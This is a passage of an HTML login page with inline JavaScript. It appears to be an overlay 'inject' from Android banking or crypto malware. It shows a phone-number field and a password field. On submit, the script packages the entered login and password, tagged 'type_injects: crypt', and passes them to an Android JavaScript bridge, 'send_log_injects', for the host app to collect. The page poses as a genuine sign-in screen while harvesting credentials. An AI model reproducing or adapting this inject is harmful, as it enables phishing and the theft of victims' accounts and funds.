            <section>
                <div style="padding: 15px;background-color: #fff;border-bottom: 1px solid #d5d5d5;">
                    <input type="password" class="input" id="password" name="password" placeholder="Password" autocomplete="off">
                </div>

                <div style="padding: 15px;">
                    <input type="submit" class="button" id="sendData" disabled value="LOGIN">
                </div>
            </section>
        </div>
    </form>
    <script>
        $('#login').mask('+0#')
        var form1 = document.getElementById('form1'),   
            form2 = document.getElementById('form2');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        login.onkeyup = () => {
            if(login.value.length > 7) {
                nextPage.disabled = false;
            } else {
                nextPage.disabled = true;
            }
        }

        nextPage.onclick = () => {
            form1.style.display = 'none';
            form2.style.display = 'block';
        }

        password.onkeyup = () => {
            if(password.value.length > 5) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.type_injects = "crypt";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
